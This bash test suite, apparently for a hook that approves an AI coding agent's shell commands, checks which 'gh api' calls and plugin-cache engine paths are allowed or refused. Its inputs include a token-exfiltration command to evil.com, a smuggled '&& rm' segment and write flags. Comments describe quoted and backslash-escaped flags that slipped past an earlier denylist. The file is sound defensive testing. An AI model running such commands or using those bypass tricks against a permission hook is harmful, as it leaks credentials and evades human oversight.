# shape failed three rounds running (-X/-f/--method/--hostname enumerated
# one at a time, then --raw-field missed, then a backslash-escaped
# `--met\hod` evaded the literal-string comparison). Every pin below either
# stays on the small safe-flag allowlist (--jq/-q, --paginate, --cache,
# --slurp, -H/--header) -> ALLOW, or is anything else at all -> REFUSE, with
# no per-flag enumeration needed on the refuse side. ---
assert "gh api repos/<owner>/<repo> -> allowed" ALLOW \
    "$(decide "$(j_bash 'gh api repos/cli/cli')")"
assert "gh api repos/... with --jq (allowlisted) -> allowed" ALLOW \
    "$(decide "$(j_bash "gh api repos/cli/cli --jq '.name'")")"
assert "gh api repos/... --paginate -H \"...\" (allowlisted) -> allowed" ALLOW \
    "$(decide "$(j_bash 'gh api repos/cli/cli --paginate -H "Accept: application/vnd.github+json"')")"
assert "gh api user (non-repos endpoint) -> refused" PASS \
    "$(decide "$(j_bash 'gh api user')")"
assert "gh api repos/... && rm segment -> refused (compound smuggling)" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli && rm foo')")"
assert "gh api \$VAR endpoint (unprovable) -> refused" PASS \
    "$(decide "$(j_bash 'gh api "repos/$OWNER/$REPO"')")"
assert "gh api repos/../foo endpoint (traversal) -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/../foo')")"

# Every one of these is "not on the allowlist" -> refused by the SAME default
# branch (no per-flag rule needed), including the exact three shapes that
# broke a denylist across three review rounds: an unenumerated write flag
# (--raw-field), a quoted/glued classic write flag, and a backslash-escaped
# flag that a literal-string denylist pattern would not have recognised.
assert "gh api repos/... --raw-field k=v -> refused (unenumerated write flag)" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --raw-field k=v')")"
assert "gh api repos/... -X POST -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli -X POST')")"
assert "gh api repos/... -X GET -> refused (not on the allowlist at all)" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli -X GET')")"
assert "gh api repos/... --method POST -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --method POST')")"
assert "gh api repos/... -f field=val -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli -f field=val')")"
assert "gh api repos/... --input - -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --input -')")"
assert "gh api repos/... --hostname evil.com -> refused (token exfil)" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --hostname evil.com')")"
assert "gh api repos/... --hostname=evil.com -> refused (token exfil)" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --hostname=evil.com')")"
assert "gh api repos/... unknown flag --frobnicate -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --frobnicate')")"
assert "gh api repos/... backslash-escaped --met\\hod POST -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli --met\hod POST')")"
assert "gh api repos/... quoted \"-f\" field=val -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli "-f" field=val')")"
assert "gh api repos/... glued quoted \"-XPOST\" -> refused" PASS \
    "$(decide "$(j_bash 'gh api repos/cli/cli "-XPOST"')")"

# The same quote-classification gap, in segment_is_engine's trailing-arg loop:
# a quoted excluded flag on a NEW (HIMMEL-2124) engine must still be refused,
# not waved through as a harmless-looking relative path.
assert "harvest-clip-body-batch.py: quoted \"--config\" -> refused" PASS \
    "$(decide_with_hook "$HOOK" "$(j_bash_cwd "python \"${HARVEST_ABS}\" \"--config\" /tmp/evil.json" "$VAULT_FIXTURE_MIXED")")"

# Minor (tokenizer-divergence family): a stray trailing quote/separator on a
# naively-split endpoint token must not desync the hook's own view of "the
# endpoint" from what the real shell actually passed as one literal arg.
# Not exploitable (the real process never sees the phantom split) -- this
# just pins that reassembly still resolves to a `repos/`-prefixed endpoint
# and the call is judged consistently (still read-shaped -> allowed).
assert "gh api endpoint with an embedded quoted separator -> still judged consistently" ALLOW \
    "$(decide "$(j_bash 'gh api "repos/x/y; echo hi"')")"

# == plugin-cache root anchor (HIMMEL-2124) ==
# obsidian-triage actually RUNS from the Claude Code plugin cache
# (~/.claude/plugins/cache/himmel/obsidian-triage/<version>/...), not just
# this checkout -- a leg session's emitted engine path legitimately resolves
# there. A fake HOME fixture stands in for the cache tree; decide_with_hook_home
# invokes the hook with that HOME so PLUGIN_CACHE_BASE resolves into it.
FAKE_HOME=$(mktemp -d "${TMPDIR:-/tmp}/cadence-fake-home.XXXXXX")
mkdir -p "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/tools/lib"
mkdir -p "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/skills/vault-lint"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/tools/harvest-clip-body-batch.py"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/tools/ig-media-fetch.py"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/tools/lib/evidence-kind.mjs"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/skills/vault-lint/vault_lint.py"
# HIMMEL-2124 acceptance-leg gap (2026-08-26): the two enrich rungs.
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/tools/fxtwitter-enrich.mjs"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.9.9/tools/reddit-enrich.mjs"
# Non-version dir basename -- same engine file, must NOT cache-anchor.
mkdir -p "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/evil/tools"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/evil/tools/harvest-clip-body-batch.py"
# Sibling (wrong) plugin, same suffix -- must NOT cache-anchor.
mkdir -p "$FAKE_HOME/.claude/plugins/cache/himmel/other-plugin/0.9.9/tools"
touch "$FAKE_HOME/.claude/plugins/cache/himmel/other-plugin/0.9.9/tools/harvest-clip-body-batch.py"
# Version dir exists but the engine file does NOT -- must NOT cache-anchor.
mkdir -p "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage/0.8.0/tools"
trap 'rm -f "$EMPTY_ROOT_HOOK" "$CYGLESS_HOOK"; rm -rf "$SPACED_ROOT" "$VAULT_FIXTURE" "$FAKE_HOME"' EXIT

if command -v cygpath >/dev/null 2>&1; then
    CACHE_ROOT_MIXED=$(cygpath -m "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage" 2>/dev/null || printf '%s' "$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage")
else
    CACHE_ROOT_MIXED="$FAKE_HOME/.claude/plugins/cache/himmel/obsidian-triage"
fi

# decide_with_hook_home <hook> <input> <fake_home> — same as decide_with_hook
# but runs the hook with HOME overridden, so PLUGIN_CACHE_BASE resolves into
# the fake cache fixture instead of the real operator HOME.
decide_with_hook_home() {
    local selected_hook="$1" input="$2" fake_home="$3" out
    out=$(printf '%s' "$input" | HOME="$fake_home" bash "$selected_hook" 2>/dev/null)
    if grepq "$out" '"permissionDecision":"allow"'; then
        echo "ALLOW"
    else
        echo "PASS"
    fi
}

# 1. ALLOW — harvest engine via the cache root.
assert "cache root: harvest-clip-body-batch.py -> allowed" ALLOW \
    "$(decide_with_hook_home "$HOOK" "$(j_bash_cwd "python \"${CACHE_ROOT_MIXED}/0.9.9/tools/harvest-clip-body-batch.py\" --scan-only x.md" "$VAULT_FIXTURE_MIXED")" "$FAKE_HOME")"

# 2. ALLOW — ig-media-fetch.py via the cache root, uv-run documented shape.
assert "cache root: ig-media-fetch.py via PYTHONUTF8=1 uv run -> allowed" ALLOW \
    "$(decide_with_hook_home "$HOOK" "$(j_bash_cwd "PYTHONUTF8=1 uv run --python 3.12 python \"${CACHE_ROOT_MIXED}/0.9.9/tools/ig-media-fetch.py\" \".\" --limit 10" "$VAULT_FIXTURE_MIXED")" "$FAKE_HOME")"

# 3. ALLOW — evidence-kind.mjs via the cache root.
assert "cache root: evidence-kind.mjs -> allowed" ALLOW \
    "$(decide_with_hook_home "$HOOK" "$(j_bash "node \"${CACHE_ROOT_MIXED}/0.9.9/tools/lib/evidence-kind.mjs\" --type note")" "$FAKE_HOME")"

# 4. ALLOW — vault_lint.py via the cache root (same plugin, consistent).
assert "cache root: vault_lint.py -> allowed" ALLOW \
    "$(decide_with_hook_home "$HOOK" "$(j_bash_cwd "python \"${CACHE_ROOT_MIXED}/0.9.9/skills/vault-lint/vault_lint.py\" \".\"" "$VAULT_FIXTURE_MIXED")" "$FAKE_HOME")"

# 4b. ALLOW — fxtwitter-enrich.mjs via the cache root (HIMMEL-2124 acceptance-
# leg gap, 2026-08-26).
assert "cache root: fxtwitter-enrich.mjs -> allowed" ALLOW \
    "$(decide_with_hook_home "$HOOK" "$(j_bash_cwd "node \"${CACHE_ROOT_MIXED}/0.9.9/tools/fxtwitter-enrich.mjs\" --vault \".\" --dry-run" "$VAULT_FIXTURE_MIXED")" "$FAKE_HOME")"

# 5. PASS — same engine file under a NON-version dir basename.
assert "cache root: non-version dir basename -> refused" PASS \
    "$(decide_with_hook_home "$HOOK" "$(j_bash "python \"${CACHE_ROOT_MIXED}/evil/tools/harvest-clip-body-batch.py\" x.md")" "$FAKE_HOME")"

# 6. PASS — same suffix under the WRONG plugin.
if command -v cygpath >/dev/null 2>&1; then
    OTHER_PLUGIN_MIXED=$(cygpath -m "$FAKE_HOME/.claude/plugins/cache/himmel/other-plugin" 2>/dev/null || printf '%s' "$FAKE_HOME/.claude/plugins/cache/himmel/other-plugin")
else
    OTHER_PLUGIN_MIXED="$FAKE_HOME/.claude/plugins/cache/himmel/other-plugin"
fi
assert "cache root: wrong plugin dir -> refused" PASS \
    "$(decide_with_hook_home "$HOOK" "$(j_bash "python \"${OTHER_PLUGIN_MIXED}/0.9.9/tools/harvest-clip-body-batch.py\" x.md")" "$FAKE_HOME")"

# 7. PASS — version dir exists but the engine file does not.
assert "cache root: version dir exists, engine file missing -> refused" PASS \
    "$(decide_with_hook_home "$HOOK" "$(j_bash "python \"${CACHE_ROOT_MIXED}/0.8.0/tools/harvest-clip-body-batch.py\" x.md")" "$FAKE_HOME")"

# 8. PASS — the uv-prefix restriction stays scoped to the two documented
# engines even via the cache root: vault_lint is not one of them.
assert "cache root: uv run against vault_lint (wrong engine) -> refused" PASS \
    "$(decide_with_hook_home "$HOOK" "$(j_bash_cwd "uv run python \"${CACHE_ROOT_MIXED}/0.9.9/skills/vault-lint/vault_lint.py\" \".\"" "$VAULT_FIXTURE_MIXED")" "$FAKE_HOME")"

# --- HIMMEL-2176 (A18): --print-engine-list ---
# himmelctl status (a later PR) shells out to this flag instead of a copied
# literal list, so the flag's output must be derived from -- and asserted
# against -- the hook's OWN ENGINE_LIST construction, never a re-typed
# expectation here (a hardcoded list would silently pass while the hook and
# the flag drift, which is exactly the bug this flag exists to prevent).
# Derive the expectation by SOURCING the hook itself (not by calling its
# --print-engine-list flag, which would just compare the flag against
# itself): a DEBUG trap fires before every top-level command the sourced
# script runs. It is a no-op until $ENGINE_LIST first becomes non-empty —
# i.e. right after the ENGINE_LIST=... assignment completes — at which point
# it tokenizes ENGINE_LIST itself (independently of the flag's own for-loop)
# and `exit`s the subshell immediately, so NONE of the hook's actual logic
# below that point (the flag check, the ROOT ANCHOR, or the stdin read) ever
# runs. This is the "stop before the hook logic" seam the plan asked for.
EXPECTED_ENGINE_TOKENS=$(
    # functrace: a DEBUG trap set in the current (non-function) shell context
    # only fires around a bare `source foo` command as a single unit by
    # default — NOT before each command foo.sh itself runs. `set -o
    # functrace` is what makes it fire per-command INSIDE the sourced file
    # too, which is what lets us stop mid-file.
    set -o functrace
    # shellcheck disable=SC2317,SC2329 # invoked indirectly through DEBUG trap; static analysis cannot see the call
    capture_engine_list_and_stop() {
        if [ -n "${ENGINE_LIST:-}" ]; then
            local _tok
            for _tok in $ENGINE_LIST; do printf '%s\n' "$_tok"; done
            exit 0
        fi
    }
    trap capture_engine_list_and_stop DEBUG
    # shellcheck disable=SC1090 # dynamic path to the hook under test
    source "$HOOK" </dev/null 2>/dev/null
)

ACTUAL_ENGINE_TOKENS=$(bash "$HOOK" --print-engine-list </dev/null 2>/dev/null)

if [ "$ACTUAL_ENGINE_TOKENS" = "$EXPECTED_ENGINE_TOKENS" ] && [ -n "$ACTUAL_ENGINE_TOKENS" ]; then
    echo "PASS --print-engine-list matches the hook's own ENGINE_LIST construction"
else
    echo "FAIL --print-engine-list — output does not match the hook's own ENGINE_LIST"
    echo "--- expected (derived from ENGINE_LIST) ---" >&2
    printf '%s\n' "$EXPECTED_ENGINE_TOKENS" >&2
    echo "--- actual ---" >&2
    printf '%s\n' "$ACTUAL_ENGINE_TOKENS" >&2
    FAILED=$((FAILED + 1))
fi

# One-token-per-line shape: every line is a non-empty <bin>:<suffix> token,
# no line contains embedded whitespace (which would mean the split-per-line
# didn't happen and a whole multi-token run leaked onto one line).
BAD_LINES=0
while IFS= read -r _line; do
    [ -n "$_line" ] || { BAD_LINES=$((BAD_LINES + 1)); continue; }
    case "$_line" in
        *[[:space:]]*) BAD_LINES=$((BAD_LINES + 1)) ;;
        *:*) ;;
        *) BAD_LINES=$((BAD_LINES + 1)) ;;
    esac
done <<< "$ACTUAL_ENGINE_TOKENS"
assert "--print-engine-list: every line is one bare <bin>:<suffix> token" 0 "$BAD_LINES"

# Does not hang / block on stdin (closed stdin, no JSON payload) and exits 0.
# `timeout` is GNU-only (absent by default on macOS) — resolve it once and
# skip just this one assertion, visibly, when it isn't on PATH rather than
# letting the whole suite fail on a missing coreutil.
_TIMEOUT_BIN="$(command -v timeout 2>/dev/null)" || _TIMEOUT_BIN=""
if [ -n "$_TIMEOUT_BIN" ]; then
    "$_TIMEOUT_BIN" 5 bash "$HOOK" --print-engine-list </dev/null >/dev/null 2>&1
    assert "--print-engine-list: exits promptly with stdin closed" 0 "$?"
else
    echo "SKIP --print-engine-list exits promptly with stdin closed — no 'timeout' binary on PATH" >&2
fi

# Normal (no-flag) invocation is completely unperturbed: the pre-existing
# ALLOW/PASS cases above already prove this, but pin it explicitly too — a
# JSON payload on stdin must still be read and decided as before.
assert "normal invocation (no flag) untouched by the new flag" ALLOW \
    "$(decide "$(j_bash "python \"${ABS}\" vault")")"

if [ "$FAILED" -eq 0 ]; then
    echo "OK cadence-approve-engines: all cases passed"
    exit 0
fi
echo "ERR cadence-approve-engines: $FAILED case(s) failed" >&2
exit 1
